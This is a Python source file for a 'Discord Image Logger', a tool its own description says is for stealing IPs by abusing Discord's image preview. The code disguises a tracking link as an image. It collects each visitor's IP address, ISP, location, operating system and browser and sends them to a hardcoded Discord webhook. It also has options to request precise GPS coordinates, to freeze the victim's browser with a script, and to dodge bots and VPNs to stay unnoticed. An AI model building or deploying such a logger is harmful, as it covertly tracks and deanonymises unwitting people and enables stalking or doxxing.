from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json
from urllib.parse import parse_qs

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu",
    "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work.
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to  
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
        })
    except:
        pass

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json = {
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
                })
            except:
                pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        if info.get("proxy", False):
            if config["vpnCheck"] == 2:
                return
            
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info.get("hosting", False):
            if config["antiBot"] == 4:
                if info.get("proxy", False):
                    pass
                else:
                    return

            if config["antiBot"] == 3:
                return

            if config["antiBot"] == 2:
                if info.get("proxy", False):
                    pass
                else:
                    ping = ""

            if config["antiBot"] == 1:
                ping = ""

        os_info, browser_info = "Unknown", "Unknown"
        if useragent:
            try:
                os_info, browser_info = httpagentparser.simple_detect(useragent)
            except:
                pass
        
        embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 'Unknown'))+', '+str(info.get('lon', 'Unknown')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', 'Unknown') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if '/' in info.get('timezone', 'Unknown') else 'Unknown'})`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting', False) and not info.get('proxy', False) else 'Possibly' if info.get('hosting', False) else 'False'}`

**PC Info:**
> **OS:** `{os_info}`
> **Browser:** `{browser_info}`

**User Agent:**
```
{useragent}
```""",
            }
        ],
        }
        
        if url: 
            embed["embeds"][0].update({"thumbnail": {"url": url}})
        
        requests.post(config["webhook"], json = embed)
        return info
    except Exception as e:
        print(f"Error making report: {e}")
        return None

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

def handle_request(request):
    try:
        # Obter informações da solicitação
        path = request.get("path", "/")
        headers = request.get("headers", {})
        query = request.get("query", {})
        
        # Extrair o IP
        ip = headers.get("x-forwarded-for", "Unknown")
        useragent = headers.get("user-agent", "")
        
        # Processar a URL da imagem
        if config["imageArgument"]:
            if query.get("url") or query.get("id"):
                try:
                    url = base64.b64decode(query.get("url", "") or query.get("id", "").encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]

        # Verificar se é um bot
        if botCheck(ip, useragent):
            if config["buggedImage"]:
                makeReport(ip, useragent, endpoint=path, url=url)
                return {
                    "statusCode": 200,
                    "headers": {
                        "Content-Type": "image/jpeg"
                    },
                    "body": base64.b64encode(binaries["loading"]).decode(),
                    "isBase64Encoded": True
                }
            else:
                makeReport(ip, useragent, endpoint=path, url=url)
                return {
                    "statusCode": 302,
                    "headers": {
                        "Location": url
                    },
                    "body": ""
                }
        else:
            # Processar localização
            if query.get("g") and config["accurateLocation"]:
                try:
                    location = base64.b64decode(query.get("g", "").encode()).decode()
                    result = makeReport(ip, useragent, location, path, url=url)
                except:
                    result = makeReport(ip, useragent, endpoint=path, url=url)
            else:
                result = makeReport(ip, useragent, endpoint=path, url=url)

            # Criar HTML de resposta
            html_content = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''

            message = config["message"]["message"]

            if result and config["message"]["richMessage"] and config["message"]["doMessage"]:
                message = message.replace("{ip}", ip or "Unknown")
                message = message.replace("{isp}", result.get("isp", "Unknown"))
                message = message.replace("{asn}", result.get("as", "Unknown"))
                message = message.replace("{country}", result.get("country", "Unknown"))
                message = message.replace("{region}", result.get("regionName", "Unknown"))
                message = message.replace("{city}", result.get("city", "Unknown"))
                message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                message = message.replace("{long}", str(result.get("lon", "Unknown")))
                message = message.replace("{timezone}", f"{result.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in result.get('timezone', 'Unknown') else 'Unknown'} ({result.get('timezone', 'Unknown').split('/')[0] if '/' in result.get('timezone', 'Unknown') else 'Unknown'})")
                message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting", False) and not result.get("proxy", False) else 'Possibly' if result.get("hosting", False) else 'False'))
                
                try:
                    os_info, browser_info = httpagentparser.simple_detect(useragent)
                    message = message.replace("{browser}", browser_info)
                    message = message.replace("{os}", os_info)
                except:
                    message = message.replace("{browser}", "Unknown")
                    message = message.replace("{os}", "Unknown")
                
                html_content = message

            if config["crashBrowser"]:
                html_content += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

            if config["redirect"]["redirect"]:
                html_content = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'

            if config["accurateLocation"] and not query.get("g"):
                html_content += """<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""

            return {
                "statusCode": 200,
                "headers": {
                    "Content-Type": "text/html"
                },
                "body": html_content
            }
    except Exception as e:
        reportError(traceback.format_exc())
        return {
            "statusCode": 500,
            "headers": {
                "Content-Type": "text/html"
            },
            "body": "500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page."
        }

def handler(request, context):
    # Adaptação para o formato de request do Vercel
    return handle_request(request)
